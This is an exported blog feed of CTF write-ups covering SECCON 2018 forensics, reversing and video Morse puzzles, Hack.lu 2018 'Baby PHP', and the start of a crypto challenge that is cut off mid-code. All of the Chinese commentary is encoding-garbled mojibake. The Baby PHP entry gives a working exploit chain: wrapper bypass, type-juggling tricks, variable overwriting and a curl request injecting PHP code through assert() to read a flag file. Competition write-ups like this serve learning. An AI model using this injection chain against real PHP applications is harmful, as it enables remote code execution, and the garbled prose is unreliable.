    <link href="https://findneo.github.io/181028-seccon-wp/"/>
    <id>https://findneo.github.io/181028-seccon-wp/</id>
    <published>2018-10-28T08:05:30.000Z</published>
    <updated>2019-01-25T23:21:37.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>ÂéãÁº©ÂëΩ‰ª§‰∏∫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'SECCON&#123;'</span>`cat key`<span class="string">'&#125;'</span> &gt; flag.txt</span><br><span class="line">zip -e --password=`perl -e <span class="string">"print time()"</span>` flag.zip flag.txt</span><br></pre></td></tr></table></figure><p>update:</p><p>###</p><p>ÊØîËæÉÊ£íÁöÑÊÄùË∑ØÊòØflag.zipÁîüÊàêÊó∂ÂàªÁöÑÊó∂Èó¥Êà≥Â∞±ÊòØ‰ªñÁöÑÂØÜÁ†Å„ÄÇÈÇ£‰πà</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stat</span> -c %Y flag.zip</span><br><span class="line">1540566641</span><br></pre></td></tr></table></figure><p>###</p><p>ÁàÜÁ†¥ÂØÜÁ†ÅÔºö</p><p><img src="1540714389474.png" alt="1540714389474"></p><p><img src="1540714399554.png" alt="1540714399554"></p><p><img src="1540714953343.png" alt="1540714953343"></p><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk J</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">3912330       0x3BB28A        ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file <span class="built_in">type</span>: binary, original name: <span class="string">"1"</span>, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS</span><br><span class="line"><span class="comment"># MS-DOS ‰ª•Â∞èÁ´ØÂ∫èÂ≠òÂÇ®Êï∞ÊçÆ</span></span><br><span class="line"></span><br><span class="line">$ strings -el J | grep SEC</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep CON</span><br><span class="line">...foo...</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC.txt</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;tktksec.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;ensic.txt</span><br><span class="line">&lt;s.txt</span><br><span class="line">&lt;_usnjrnl.txt</span><br><span class="line">&lt;2018&#125;.txt</span><br><span class="line">&lt;logfile.txt.0</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq | tail -n 10 | sed -E <span class="string">'s/&lt;(.*).txt.*/\1/g'</span> | tr  -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;F0rtktksecF0rensics_usnjrnl2018&#125;</span><br></pre></td></tr></table></figure><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Runme"><a href="#Runme" class="headerlink" title="Runme"></a>Runme</h2><p>miscÂºèÁöÑÊ∞¥È¢ò„ÄÇÂ∞±ÊòØ‰∏çÊñ≠Ë∑üËøõÂáΩÊï∞ÔºåÊØè‰∏™ÂáΩÊï∞‰º†ÂÖ•‰∏Ä‰∏™ÂèÇÊï∞ÔºåÊãºÂáëËµ∑Êù•Â∞±ÂèØ‰ª•‰∫Ü„ÄÇ‰ºöÂæóÂà∞ <code>&quot;C:\Temp\SECCON2018Online.exe&quot; SECCON{Runn1n6_P47h}</code> „ÄÇ</p><p>update:</p><p>###</p><p>ÊØîËæÉÈ™öÁöÑÂÅöÊ≥ïÊòØÁõ¥Êé•strings</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ strings runme</span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">...foo...</span><br><span class="line">BRjS</span><br><span class="line">BRjE</span><br><span class="line">BRjC</span><br><span class="line">BRjC</span><br><span class="line">BRjO</span><br><span class="line">BRjN</span><br><span class="line">BRj&#123;</span><br><span class="line">BRjR</span><br><span class="line">BRju</span><br><span class="line">...bar...</span><br><span class="line">$ strings runme | sed -E <span class="string">'s/BRj(.)/\1/g'</span> | tr -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;Runn1n6_P47h&#125;</span><br></pre></td></tr></table></figure><p>###</p><h1 id="Media"><a href="#Media" class="headerlink" title="Media"></a>Media</h1><h2 id="Needle-in-a-haystack"><a href="#Needle-in-a-haystack" class="headerlink" title="Needle in a haystack"></a>Needle in a haystack</h2><p>Êèê‰æõ‰∏Ä‰∏™YouTubeÁöÑËßÜÈ¢ëÈìæÊé•Ôºà<a href="https://www.youtube.com/watch?v=sTKP2btHSBQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=sTKP2btHSBQ</a> ÔºâÔºåÈïøËææ‰πù‰∏™Â§öÂ∞èÊó∂„ÄÇ</p><p>‰ªé <a href="https://y2mate.com/youtube/sTKP2btHSBQ" target="_blank" rel="noopener">https://y2mate.com/youtube/sTKP2btHSBQ</a> ‰∏ãËΩΩ360pÁöÑÔºåÂ∑Æ‰∏çÂ§ö1.9G„ÄÇÂø´ËøõÊü•Áúã‰ºöÂèëÁé∞Âè≥‰∏ãËßíÊúâ‰∏Ä‰∏™ÊàøÈó¥ÁöÑÁÅØ‰∫ÆÁÅ≠ÂæàÊúâËßÑÂæãÔºåÂü∫Êú¨ÊØèÂàÜÈíüÈÉΩ‰ºöÊúâÂèòÂåñ„ÄÇ</p><p><img src="1540715588584.png" alt="1540715588584"></p><p>Êàë‰ª¨Êää‰∫ÆËÆ∞‰∏∫1ÔºåÊöóËÆ∞‰∏∫0ÁöÑËØùÔºåÊï¥‰∏™ËßÜÈ¢ëÊó∂Èïø545ÂàÜÈíüÔºåÂèØ‰ª•ÂæóÂà∞Á∫¶545ÊØîÁâπÁöÑ‰ø°ÊÅØ„ÄÇÂ§ßÊ¶ÇÊòØËøôÊ†∑Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100001010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠ÊúâÂõõÁßçÊï∞ÊçÆÔºå<code>0</code>Ôºå<code>1</code> Ôºå<code>000</code> Ôºå<code>111</code> ÔºåÂàÜÂà´ÂØπÂ∫î‰∫Æ„ÄÅÊöó„ÄÅÈïø‰∫Æ„ÄÅÈïøÊöóÂõõÁßçÁä∂ÊÄÅÔºåÂØπÂ∫îÂà∞Êë©ÊñØÁîµÁ†ÅÂàôÊòØ<code>.</code> Ôºå<code>Áü≠Èó¥Èöî</code>Ôºå<code>-</code> Ôºå<code>ÈïøÈó¥Èöî</code> „ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        <span class="keyword">if</span> s[i:i+<span class="number">3</span>] == <span class="string">'000'</span>:</span><br><span class="line">            res+=<span class="string">' '</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i:i+<span class="number">3</span>] == <span class="string">'111'</span>:</span><br><span class="line">            res+=<span class="string">'-'</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'1'</span>:</span><br><span class="line">            res+=<span class="string">'.'</span></span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'0'</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">raw=<span class="string">'01010100010001110101110100011101011101000111011101110001110100011101011101110100010101000111011101110001110111000100011100010100011101110001000101010001110101010101110001011100011101010101011100010101000100011101011101000101110100010001110001110101010101110001110111000100010101000101010001011100011101110100010001110101010101110001110101010001011101000111011101110001011100011101010001110101110100010111000101010001110??01010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">may=<span class="string">'010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100001010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">print(do(may))</span><br><span class="line"><span class="comment"># ... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ..- ..... - ...- . . -. ..- ..-. ..- .. . - .. . .. -.</span></span><br><span class="line"><span class="comment"># http://rumkin.com/tools/cipher/morse.php</span></span><br><span class="line"><span class="comment"># SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTU5TVEENUFUIETIEIN</span></span><br></pre></td></tr></table></figure><p>Â§©‰∫ÆÂêéÁúãÂæóÂæà‰∏çÊ∏ÖÊô∞‰∫ÜÔºåËÄå‰∏îË≤å‰ºº 6h58min ‰πãÂêéÁ™óÊà∑ÈÉΩ‰ºöÈó¥Ê≠áÊÄßÂú∞Ë¢´ÂÖ≥‰∏äÔºåÊâÄ‰ª•flagÁöÑÂêéÂçäÊÆµÊúâÁÇπÈóÆÈ¢ò„ÄÇ</p><p><img src="1540716372243.png" alt="1540716372243"></p><p>update:</p><p>###</p><p>ÂÆûÈôÖ‰∏äÂ§©‰∫Æ‰ª•ÂêéÁî®Á™óÊà∑ÁöÑÂºÄÂÖ≥Êù•Ë°®Á§∫ÔºåÁ™óÊà∑ÊâìÂºÄ‰∏∫1ÔºåÁ™óÊà∑ÂÖ≥Èó≠‰∏∫0ÔºàÊ≠£Â•ΩÂíåÂéüÊù•ÁöÑÂ§ÑÁêÜÊñπÂºè01Áõ∏ÂèçÔºåÊâÄ‰ª•Âæó‰∏çÂà∞flagÔºâÔºåÊÄùÁª¥Â§™ÂÉµÁ°¨ÂïäüòÇ</p><p>ÈÇ£‰πàÂ∞±ÂæóÂà∞Â¶Ç‰∏ãÁªìÊûúÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100010101000111010101010111000111010101000111011101110001011101010001110101000101110101000111010111011100011101011101110101110000</span><br><span class="line">... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ... -....- -... --- .-.. -.. .-.. -.-- -.--.-</span><br><span class="line">SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTS-BOLDLY)</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™ÂõæÁâáËß£ÈáäÂæóÂæàÂà∞‰Ωç‰∫ÜÔºå‰∏çËøáÊàëËßâÂæóÂæíÊâãÂºÄÂÖ≥‰∏§‰∏™Â§öÂ∞èÊó∂ÁöÑÁ™óÊà∑Â§™‰∏çÈªëÂÆ¢‰∫ÜÂêßÔºå‰ªñ‰ª¨‰∏ÄÂÆöÁî®‰∫ÜÊüêÁßçÊñπÂºèËá™Âä®Âåñ„ÄÇ</p><p><img src="1540778376203.png" alt="1540778376203"></p><p>###</p><p>update2:</p><p>###</p><p>ÊúâÂ§ß‰Ω¨ÂÅö‰∫ÜËá™Âä®ÂåñÔºåÊïàÊûúËõÆÂ•ΩÁöÑ„ÄÇ</p><p>Ôºà<a href="https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/" target="_blank" rel="noopener">https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/</a> Ôºâ</p><p>###</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class=&quot;headerlink&quot; title=&quot;Forensics&quot;&gt;&lt;/a&gt;Forensics&lt;/h1&gt;&lt;h2 id=&quot;Unzip&quot;&gt;&lt;a href=&quot;#Unzip&quot; class=&quot;header
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hack.lu CTF 2018 Baby PHP</title>
    <link href="https://findneo.github.io/181022-hackluctf-web/"/>
    <id>https://findneo.github.io/181022-hackluctf-web/</id>
    <published>2018-10-22T13:44:52.000Z</published>
    <updated>2019-01-25T23:21:37.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby PHP"></a>Baby PHP</h1><p>ÁéØÂ¢ÉÔºö<a href="https://arcade.fluxfingers.net:1819/" target="_blank" rel="noopener">https://arcade.fluxfingers.net:1819/</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+ÔºÑ/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123; </span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‚ÄÆb = <span class="string">"2"</span>;$a=<span class="string">"‚ÄÆb"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure><p>Áî® <code>php -S 127.0.0.1:8080</code> Ëµ∑‰∏Ä‰∏™Êú¨Âú∞ÊúçÂä°Áî®‰∫éË∞ÉËØï„ÄÇ</p><p>13~15Ë°åÂèØÈÄöËøáPHP wrapper ÁªïËøá„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=php://input"</span> -d <span class="string">"Hello Challenge!"</span></span><br><span class="line">or</span><br><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=data://text/plain,Hello%20Challenge!"</span></span><br></pre></td></tr></table></figure><p>24~26Ë°å‰º†ÂÖ•key1=1337Âç≥ÂèØÔºå$k1Á±ªÂûã‰∏∫string„ÄÇ</p><p>29Ë°åÁöÑÁæéÂÖÉÁ¨¶ÊòØ‰∏™ÂÆΩÂ≠óËäÇÂ≠óÁ¨¶ÔºåÂπ∂‰∏çÊòØASCII‰∏∫36ÁöÑÂ≠óÁ¨¶„ÄÇ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">encodeURI</span>(<span class="string">"ÔºÑ"</span>)</span><br><span class="line">&lt;<span class="string">"%EF%BC%84"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $e=str_repeat(<span class="string">"0"</span>,<span class="number">42</span><span class="number">-3</span><span class="number">-4</span>).<span class="string">"1337 "</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> strlen($e);</span><br><span class="line"><span class="number">42</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> $e;</span><br><span class="line"><span class="number">000000000000000000000000000000000001337</span>ÔºÑ</span><br></pre></td></tr></table></figure><p>38Ë°åÂèØ‰ª•ÈÄöËøá‰º†ÂÖ•Êï∞ÁªÑÁªïËøá„ÄÇ39Ë°åÊúâÂèòÈáèË¶ÜÁõñ„ÄÇ</p><p>44Ë°åÊòØ‰∏™ÈöúÁúºÊ≥ïÔºåÂú®Á¨¨‰∏Ä‰∏™ÁæéÂÖÉÁ¨¶ÂêéÊúâ‰∏™Unicode Â≠óÁ¨¶(<code>U+202e</code>)ÔºåÁî®‰ª•Â∑¶Âè≥ÂèçËΩ¨ÔºåËØ¶ËßÅ <a href="https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick" target="_blank" rel="noopener">rtlo-trick</a>„ÄÇÂçÅÂÖ≠ËøõÂà∂ÁúãËµ∑Êù•ÂÆûÈôÖ‰∏äÊòØËøôÊ†∑Ôºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000002f0: 24e2 80ae 6220 3d20 2232 223b 2461 3d22  $...b = <span class="string">"2"</span>;<span class="variable">$a</span>=<span class="string">"</span></span><br><span class="line"><span class="string">00000300: e280 ae62 223b 2f2f 3b31 3d62 0d0a 0d0a  ...b"</span>;//;1=b....</span><br></pre></td></tr></table></figure><p>Â∞±ÊòØËØ¥ÔºåÁ¨¨44Ë°åÊòØ <code>$\u{202E}b = &quot;2&quot;;$a=&quot;\u{202E}b&quot;;//;1=b</code> Ôºå‰ΩÜÁªèËøáUnicodeÂ≠óÁ¨¶‰ΩúÁî®ÂêéÊòæÁ§∫Âá∫Êù•ÁöÑÊòØ<code>$b=1;//;&quot;b&quot;=a$;&quot;2&quot; = b</code> „ÄÇÊé®Ëçê‰∏Ä‰∏™ËæÖÂä©Â∑•ÂÖ∑Ôºö<a href="https://r12a.github.io/app-conversion/" target="_blank" rel="noopener">https://r12a.github.io/app-conversion/</a> „ÄÇ</p><p>Âàô$$aÁöÑÂÄº‰∏∫2Ôºå‰º†ÂÖ•k1=2Âç≥ÂèØ„ÄÇ</p><p>51Ë°åËÆæÁΩÆÂú®Êñ≠Ë®ÄÂ§±Ë¥•Êó∂‰∏≠Ê≠¢ÊâßË°å„ÄÇ</p><p>52Ë°åÂèØ‰ª•ÊâßË°åPHP‰ª£Á†Å„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Œª  curl -sg <span class="string">"https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=highlight_file(%22flag.php%22);//"</span> | grep -o <span class="string">'flag&#123;.*&#125;'</span></span><br><span class="line">flag&#123;7c217708c5293a3264bb136ef1fadd6e&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Baby-PHP&quot;&gt;&lt;a href=&quot;#Baby-PHP&quot; class=&quot;headerlink&quot; title=&quot;Baby PHP&quot;&gt;&lt;/a&gt;Baby PHP&lt;/h1&gt;&lt;p&gt;ÁéØÂ¢ÉÔºö&lt;a href=&quot;https://arcade.fluxfingers.net:181
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Êä§ÁΩëÊùØËß£È¢òËÆ∞ÂΩï</title>
    <link href="https://findneo.github.io/181013-huwangbei-writeup/"/>
    <id>https://findneo.github.io/181013-huwangbei-writeup/</id>
    <published>2018-10-13T16:17:37.000Z</published>
    <updated>2019-01-25T23:38:25.504Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1539436751699.png" alt="1539436751699"></p><h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(M,K)</span>:</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span><span class="params">(m,K)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=round(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=open(<span class="string">"flag"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> len(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-len(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="keyword">print</span> test.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(test,K).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(m,K).encode(<span 